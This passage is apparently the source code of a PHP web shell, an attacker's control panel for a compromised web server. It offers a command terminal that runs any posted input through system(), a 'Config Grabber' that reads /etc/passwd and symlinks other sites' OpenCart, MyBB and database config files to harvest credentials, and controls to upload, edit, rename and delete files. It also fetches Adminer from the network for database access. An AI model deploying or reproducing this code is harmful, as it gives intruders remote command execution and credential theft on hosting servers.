                    system("ln -s ".$user."/httpdocs/admin/config.php ".$jembod."-OpenCart.txt");
                    system("ln -s ".$user."/httpdocs/application/config/database.php ".$jembod."-Ellislab.txt");
                    system("ln -s ".$user."/httpdocs/inc/connect.php ".$jembod."-Parallels.txt");
                    system("ln -s ".$user."/httpdocs/inc/config.php ".$jembod."-MyBB.txt");
                }
            }

        }
        public static function tools($name = null) {
            switch ($name) {
                case 'terminal':
                    ?>
                    <div class="edit">
                        <table width="100%" class="edit">
                            <tr>
                                <td class="action">
                                    <span>Terminal</span>
                                </td>
                            </tr>
                            <form method="post">
                                <tr>
                                    <td>
                                        <input type="text" name="command" placeholder="command">
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <input type="submit" name="submit">
                                    </td>
                                </tr>
                            </form>
                            <?php
                            if (isset($_POST['submit'])) {
                                if ($_POST['command']) {
                                    ?>
                                    <tr>
                                        <td>
                                            <textarea style="height:265px;" readonly><?= system($_POST['command']) ?></textarea>
                                        </td>
                                    </tr>
                                    <?php
                                }
                            }
                            ?>
                        </table>
                    </div>
                    <?php
                    break;
                case 'config':
                    if(x::OS() == "Windows") die(print("<script>alert('Just for windows server')</script>"));
                    if (isset($_POST['submit'])) {
                        if (self::config($_POST['passwd'])) {
                            print("success");
                        } else {
                            ?> <script>window.location='.config'</script> <?php
                        }
                    }
                    ?>
                    <div class="edit">
                        <table width="100%" class="edit">
                            <tr>
                                <td class="action" colspan="3">
                                    <span>Config Grabber</span>
                                </td>
                            </tr>
                            <form method="post">
                                <tr>
                                    <td>
                                        <textarea name="passwd"><?= include("/etc/passwd") ?></textarea>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <input type="submit" name="submit">
                                    </td>
                                </tr>
                            </form>
                        </table>
                    </div>
                    <?php
                    break;
            }
        } 
        public static function countDir($filename) {
            return @count(scandir($filename)) -2;
        }
        public static function getimg($filename) {
            self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            switch (self::$extension) {
                case 'php1':
                case 'php2':
                case 'php3':
                case 'php4':
                case 'php5':
                case 'php6':
                case 'phtml':
                case 'php':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f706e672f3132382f3333372f3333373934372e706e67");
                    break;
                case 'md':
                    print self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323738322f323738323634382e737667");
                    break;
                case 'html':
                case 'htm':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373933372e737667");
                    break;
                case 'txt':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373935362e737667");
                    break;
                case 'json':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3133362f3133363532352e737667");
                    break;
                case 'xml':
                    print self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323635362f323635363434332e737667");
                    break;
                case 'png':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373934382e737667");
                    break;
                case 'ico':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363837332e737667");
                    break;
                case 'jpg':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3133362f3133363532342e737667");
                    break;
                case 'css':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f323330362f323330363034312e737667");
                    break;
                case 'js':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363835362e737667");
                    break;
                case 'pdf':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363836322e737667");
                    break;
                case 'mp3':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f323631312f323631313430312e737667");
                    break;
                case 'mp4':
                case 'm4a':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313731392f313731393834332e737667");
                    break;
                case 'py':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3631372f3631373533312e737667");
                    break;
                case 'sh':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3631372f3631373533352e737667");
                    break;
                case 'ini':
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363839302e737667");
                    break;
                default:
                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3833332f3833333532342e737667");
                    break;
            }
        }
        public static function hex($string){
            $hex = '';
            for ($i=0; $i < strlen($string); $i++) {
                $hex .= dechex(ord($string[$i]));
            } return $hex;
        }
        public static function unhex($hex){
            $string = '';
            for ($i=0; $i < strlen($hex)-1; $i+=2) {
                $string .= chr(hexdec($hex[$i].$hex[$i+1]));
            } return $string;
        }
        public static function ftime($filename) {
             return date('d M Y - H:i A', filemtime($filename));
        }
        public static function countStuff($handle, &$fileCount, &$folderCount) {
            if ($handle = opendir($handle)) {
                while (false !== ($entry = readdir($handle))) {
                    if ($entry != "." && $entry != "..") {
                        if (is_dir($entry)) {
                            self::countStuff($entry, $fileCount, $folderCount);
                            $folderCount++;
                        } else {
                            $fileCount++;
                        }
                    }
                } closedir($handle);
            }
        }
        public static function chname($filename, $newname) {
            return rename($filename, $newname);
        }
        public static function getfile($url, $data) {
            self::$handle = fopen($data, "w");
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FILE, self::$handle);
            return curl_exec($ch);
            curl_close($ch);
            fclose(self::$handle);
            ob_flush();
            flush();

        }
        public static function size($filename) {
            if (is_file($filename)) {
                $filepath = $filename;
                if (!realpath($filepath)) {
                    $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
                }
                $filesize = filesize($filepath);
                $array = array("TB","GB","MB","KB","Byte");
                $total = count($array);
                while ($total-- && $filesize > 1024) {
                    $filesize /= 1024;
                } return round($filesize, 2) . " " . $array[$total];
            }
        }
        public static function displayinfo() { ?>
            <div class="infos">
                <table width="100%" class="infos">
                    <tr>
                        <td>System</td>
                        <td>:</td>
                        <td><?= x::info("kernel") ?></td>
                    </tr>
                    <tr>
                        <td>PHPVersi</td>
                        <td>:</td>
                        <td><?= x::info("phpversion") ?></td>
                    </tr>
                    <tr>
                        <td>IP</td>
                        <td>:</td>
                        <td><?= x::info("ip") ?></td>
                    </tr>
                    <tr>
                        <td>Software</td>
                        <td>:</td>
                        <td><?= x::info("software") ?></td>
                    </tr>
                    <tr>
                        <td>Domain</td>
                        <td>:</td>
                        <td><?= x::info("domain") ?></td>
                    </tr>
                    <tr>
                        <td>MySQL</td>
                        <td>:</td>
                        <td><?= x::info("mysql") ?></td>
                    </tr>
                    <tr>
                        <td>Mail</td>
                        <td>:</td>
                        <td><?= x::info("mail") ?></td>
                    </tr>
                    <tr>
                        <td>Disable Function</td>
                        <td>:</td>
                        <td><?= x::info("disable_function") ?></td>
                    </tr>
                    <tr>
                        <td>HDD</td>
                        <td>:</td>
                        <td><?= x::info("hdd") ?></td>
                    </tr>
                </table>
            </div>
        </div>
        <?php }
    }
    $_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
    ?>
    <div class="row">
        <div class="col-xs-6 center cs">
            <?php
            if (!empty($data = @$_POST['filename'])) {
                foreach ($data as $key => $filename) {
                    switch ($_POST['mode']) {
                        case 'delete':
                            print($filename);
                            break;

                        default:
                            # code...
                            break;
                    }
                }
            }
            if (isset($_GET['logout'])) {
                logout();
            }
            if (isset($_GET['adminer'])) {
                if (x::getfile("https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php", "adminer.php")) {
                    print("<script>
                                alert('<i><a class=alert href=adminer.php>adminer.php</a></i> was created')
                           </script>"
                        );
                } else {
                    print("<script>alert('permission danied')</script>");
                }
            }
            if (isset($_GET['coomingsoong'])) {
                print("<script>alert('<h2>Cooming Soon</h2>')</script>");
            }
            switch (@$_POST['action']) {
                case 'delete':
                    if (x::delete($_POST['file'])) {
                        print("<script>alert('<h3>Deleted</i></h3>')</script>");
                    } else {
                        print("<script>alert('<h3>permission danied</h3>')</script>");
                    }
                    break;
                case 'chname':
                    if (isset($_POST['chname'])) {
                        if (x::chname($_POST['file'], x::unhex($_POST['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
                            print("<script>alert('<h3>success</h3>')</script>");
                        } else {
                            print("<script>alert('<h3>failed</h3>')</script>");
                        }
                    }
                    ?>
                    <div class="chname">
                                <table width="100%" class="chname">
                                    <tr>
                                        <td class="action" colspan="3">
                                            <span>
                                                <a href="?cd=<?= $_GET['cd'] ?>">
                                                    <i class="fa fa-arrow-left" aria-hidden="true"></i>
                                                </a>
                                            </span>
                                            &nbsp;&nbsp;
                                            <span>CHANGE NAME</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="width:120px;">
                                            Filename
                                        </td>
                                        <td>:</td>
                                        <td>
                                            <?= x::w__($_POST['file'], basename($_POST['file'])) ?>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="width:120px;">
                                            Size
                                        </td>
                                        <td>:</td>
                                        <td>
                                            <?= x::size($_POST['file']) ?>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="width:120px;">
                                            Last Modif
                                        </td>
                                        <td>:</td>
                                        <td>
                                            <?= x::ftime($_POST['file']) ?>
                                        </td>
                                    </tr>
                                    <tr>
                                        <form method="post" action="?cd=<?= $_GET['cd'] ?>">
                                            <td colspan="3">
                                                <div class="button">
                                                    <button name="action" value="edit">
                                                        <i class="far fa-edit" title="Edit"></i>&nbsp;
                                                        Edit
                                                    </button>
                                                    <button disabled name="action" value="chname" title="Rename">
                                                        <i class="fa fa-magic" aria-hidden="true"></i>&nbsp;
                                                        Rename
                                                    </button>
                                                    <button name="action" value="delete" title="Delete">
                                                        <i class="fa fa-times"></i>&nbsp;
                                                        Delete
                                                    </button>
                                                </div>
                                            </td>
                                        <input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
                                        </form>
                                    </tr>
                                    <form method="post">
                                        <tr>
                                            <td colspan="3">
                                                <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
                                            </td>
                                        </tr>
                                        <tr>
                                            <td colspan="3">
                                                <input type="submit" name="chname" value="CHANGE">
                                                <input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
                                                <input type="hidden" name="action" value="chname">
                                            </td>
                                        </tr>
                                    </form>
                                </table>
                            </div>
                            <br><br><br><br><br><br><br><br><br><br>
                    <?php
                    break;
                case 'edit':
                    if (isset($_POST['edit'])) {
                        if (x::save($_POST['file'], $_POST['data'], 'save', 'w')) {
                            print("<script>alert('<h3>failed</h3>')</script>");
                        } else {
                            print("<script>alert('<h3>success</h3>')</script>");
                        }
                    }
                    ?>
                    <div class="edit">
                        <table width='100%' class="edit">
                            <tr>
                                <td class="action" colspan="3">
                                    <span>
                                        <a href="?cd=<?= $_GET['cd'] ?>">
                                            <i class="fa fa-arrow-left" aria-hidden="true"></i>
                                        </a>
                                    </span>
                                    &nbsp;&nbsp;
                                    <span>EDIT</span>
                                </td>
                            </tr>
                            <tr>
                                <td style="width:120px;">
                                    Filename
                                </td>
                                <td>:</td>
                                <td>
                                    <?= x::w__($_POST['file'], basename($_POST['file'])) ?>
                                </td>
                                </tr>
                            <tr>
                                <td style="width:120px;">
                                    Size
                                </td>
                                <td>:</td>
                                <td>
                                    <?= x::size($_POST['file']) ?>
                                </td>
                            </tr>
                            <tr>
                                <td style="width:120px;">
                                    Last Modif
                                </td>
                                <td>:</td>
                                <td>
                                    <?= x::ftime($_POST['file']) ?>
                                </td>
                            </tr>
                            <tr>
                                <form method="post" action="?cd=<?= $_POST['cd'] ?>">
                                    <td colspan="3">
                                        <div class="button">
                                            <button disabled>
                                                <i class="far fa-edit" title="Edit"></i>&nbsp;
                                                Edit
                                            </button>
                                            <button name="action" value="chname" title="Rename">
                                                <i class="fa fa-magic" aria-hidden="true"></i>&nbsp;
                                                Rename
                                            </button>
                                            <button name="action" value="delete" title="Delete">
                                                <i class="fa fa-times"></i>&nbsp;
                                                Delete
                                            </button>
                                        </div>
                                    </td>
                                    <input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
                                </form>
                            </tr>
                            <form method="post">
                                <tr>
                                    <td colspan="3">
                                        <textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="3">
                                        <input type="submit" name="edit" value="SAVE">
                                        <input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
                                        <input type="hidden" name="action" value="edit">
                                    </td>
                                </tr>
                            </table>
                        </div>
                    </form>
                    <br><br>
                    <?php
                    break;
                }
                if (isset($_GET['cd'])) {
                    x::cd(x::unhex($_GET['cd']));
                } elseif (isset($_POST['open'])) {
                    x::cd(x::unhex($_POST['open']));
                }
                ?>
                <div class="files">
                    <div class="pwd">
                        <?= x::pwd() ?> &nbsp; ( <?= x::w__(getcwd(), 'writable') ?> )
                    </div>
                    <div class="infiles">
                <table width="100%" id="myTable">
                <?php
                foreach (x::files('dir') as $dir) {
                    ?>
                    <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                        <tr>
                            <td class="files">
                                <div class="block">
                                    <a href="?cd=<?= $dir['link'] ?>" title='<?= basename($dir['name']) ?>'>
                                        <div class="img">
                                            <img src="https://image.flaticon.com/icons/svg/716/716784.svg">
                                        </div>
                                        <div class="name">
                                            <div class="file">
                                                <?= x::sortname(1, $dir['name']) ?>
                                            </div>
                                            <div class="date">
                                                <?= $dir['size'] ?>&nbsp;&nbsp;&nbsp;
                                                <?= $dir['perms'] ?>&nbsp;&nbsp;&nbsp;
                                                <?= x::ftime($dir['name']) ?>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                            </td>
                        </tr>
                    </form>
                <?php }
                foreach (x::files('file') as $file) {
                    $search = array('.', ' ', '(', ')');
                    $rp = str_replace($search , '', basename($file['name']));
                    ?>
                        <tr>
                            <td class="files">
                                <div class="block">
                                    <a  href="#<?= $rp ?>"
                                        data-modal='#action<?= $rp ?>'
                                        title='<?= basename($file['name']) ?>'>
                                        <div class="img">
                                            <img src="<?= x::getimg($file['name']) ?>">
                                        </div>
                                        <div class="name">
                                            <div class="file">
                                                <?= x::sortname(1, $file['name']) ?>
                                            </div>
                                            <div class="date">
                                                <?= $file['size'] ?>&nbsp;&nbsp;&nbsp;
                                                <?= $file['perms'] ?>&nbsp;&nbsp;&nbsp;
                                                <?= x::ftime($file['name']) ?>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                                <div style="width:300px;" id="action<?= $rp ?>" class="modal">
                                    <?php
                                    switch (x::getextension($file['name'])) {
                                        case 'ico':
                                        case 'png':
                                        case 'jpg':
                                        case 'jpeg':
                                        case 'gif':
                                        case 'bmp':
                                            ?>
                                            <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                                                <div class="filename">
                                                    <span>Filename : </span>
                                                    <?= x::w__($file['name'],
                                                        x::sortname(2, $file['name'])) ?>
                                                </div>
                                                <center><br>
                                                    <img src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>">
                                                </center><br>
                                                <button name="action" value="chname">
                                                    <i class="fa fa-magic"></i>&nbsp;
                                                    Change Name
                                                </button>
                                                <button name="action" value="delete">
                                                    <i class="fa fa-times"></i>&nbsp;&nbsp;
                                                    Delete
                                                </button>
                                                <input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
                                            </form>
                                            <?php
                                            break;
                                        case 'mp3':
                                        case 'mp4':
                                            switch (x::getextension($file['name'])) {
                                                case 'mp3':
                                                    $result = str_replace('mp3', 'Audio', x::getextension($file['name']));
                                                    break;
                                                case 'mp4':
                                                    $result = str_replace('mp4', 'Video', x::getextension($file['name']));
                                                    break;
                                            }
                                            ?>
                                            <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                                                <div class="filename">
                                                    <span>Filename : </span>
                                                    <?= x::w__($file['name'],
                                                        x::sortname(2, $file['name'])) ?>
                                                </div>
                                                <center><br>
                                                    <<?= $result ?> controls>
                                                        <source src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>" type="<?= $result ?>/<?= x::getextension($file['name']) ?>">
                                                    </<?= $result ?>>
                                                </center><br>
                                                <button name="action" value="chname">
                                                    <i class="fa fa-magic"></i>&nbsp;
                                                    Change Name
                                                </button>
                                                <button name="action" value="delete">
                                                    <i class="fa fa-times"></i>&nbsp;&nbsp;
                                                    Delete
                                                </button>
                                                <input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
                                            </form>
                                            <?php
                                            break;
                                        default:
                                            ?>
                                            <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                                                <div class="filename">
                                                    <span>Filename : </span>
                                                    <?= x::w__($file['name'],
                                                        x::sortname(2, $file['name'])) ?>
                                                </div>
                                                <button name="action" value="edit">
                                                    <i class="far fa-edit"></i>&nbsp;
                                                        Edit
                                                </button>
                                                <button name="action" value="chname">
                                                    <i class="fa fa-magic"></i>&nbsp;
                                                    Change Name
                                                </button>
                                                <button name="action" value="delete">
                                                    <i class="fa fa-times"></i>&nbsp;&nbsp;
                                                    Delete
                                                </button>
                                                <input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
                                            </form>
                                            <?php
                                            break;
                                    }
                                    ?>
                                </div>
                                <script>
                                    $(function() {
                                        $('a[data-modal]').on('click', function() {
                                            $($(this).data('modal')).modal();
                                            return false;
                                        });
                                    });
                                </script>
                                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
                                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
                            </td>
                        </tr>
                <?php }
                ?>
            </table>
        </div>
    </div>
</div>
<div class="col-xs-6 center">
    <?php
    if (isset($_GET['addfolder'])) {
        if (isset($_POST['submit'])) {
            if (x::addfolder($_POST['dirname'])) {
                print("<script>alert('Folder <b><i>".$_POST['dirname']."</i></b>&nbsp;&nbsp; Added !')</script>");
                print("<script>alert('permission danied')</script>");
            } else {
                print("<script>alert('permission danied')</script>");   
            }
        }
        ?>
        <div class="addfiles">
            <table width="100%" class="addfiles">
                <tr>
                    <td class="action" colspan="3">
                        <span>Add Folder</span>
                    </td>
                </tr>
                <form method="post">
                    <tr>
                        <td>
                            <input type="text" name="dirname" placeholder="untitle">
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <input type="submit" name="submit" value="Add">
                        </td>
                    </tr>
                </form>
            </table>
        </div>
        <?php
        exit();
    }
    if (isset($_GET['addfiles'])) {
        if (isset($_POST['submit'])) {
            if (x::addfiles($_POST['filename'], $_POST['data'])) {
                print("<script>alert('permission danied')</script>");
            } else {
                print("<script>alert('File <b><i>".$_POST['filename']."</i></b>&nbsp;&nbsp; Added !')</script>");
            }
        }
        ?>
        <div class="addfiles">
            <table width="100%" class="addfiles">
                <tr>
                    <td class="action">
                        <span>Add Files</span>
                    </td>
                </tr>
                <form method="post">
                    <tr>
                        <td>
                            <input type="text" name="filename" placeholder="untitle.php">
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <textarea name="data" placeholder="your code"></textarea>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <input type="submit" name="submit" value="Add">
                        </td>
                    </tr>
                </form>
            </table>
        </div>
        <?php
        exit();
    }
    if (isset($_GET['terminal'])) {
        //print('<script>alert("<h3>Cooming Soon</h3>")</script>');
        x::tools('terminal', $_GET['cd']);
        exit();
    }
    if (isset($_GET['config'])) {
        x::tools('config', '');
        exit();
    }
    if (isset($_GET['upload'])) {
        ?>
        <div class="upload">
            <table width="100%" class="upload">
                <form method="post" enctype="multipart/form-data" id="myForm">
                    <tr>
                        <td class="action" colspan="3">
                            <span><i class="fa fa-upload"></i> UPLOAD</span>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div id="upload" onclick="getFile()">CHOOSE FILE</div>
                            <div style='height: 0px;width: 0px; overflow:hidden;'>
                                <input
                                    id="upfile"
                                    type="file"
                                    name="file[]"
                                    onchange="javascript:updateList()" multiple>
                            </div>
                        </td>
                        <td>
                            <button type="submit" name="upload" id="submit">UPLOAD</button>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class="up" id="fileList"></div>
                        </td>
                    </tr>
                </form>
            </table>
            <div class="role">
                <table width="100%">
                    <?php
                    if (isset($_POST['upload'])) {
                        $files = count($_FILES['file']['tmp_name']);
                        for ($i=0; $i < $files ; $i++) {
                            if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) { ?>
                                <tr>
                                    <td colspan="2">
                                        <div class="alert">
                                            <div class="success">
                                                <img src="<?= x::getimg($_FILES['file']['name'][$i]) ?>" class='icons'>
                                                <a href="?cd=<?= $_GET['cd'] ?>&preview=<?= x::hex($_FILES['file']['name'][$i]) ?>">
                                                    <?= $_FILES['file']['name'][$i] ?>
                                                </a>
                                                <span>Uploaded !</span>
                                            </div>
                                        </div>
                                    </td>
                                </tr>
                            </div>
                        <?php } else {
                            print "<script>alert('Upload Failed')</script>";
                        }
                    }
                }
                ?>
            </table>
        </div>
        <?php
        exit();
    }
    ?>
    <div class="display">
        <?= x::displayinfo() ?>
    </div>
</center>
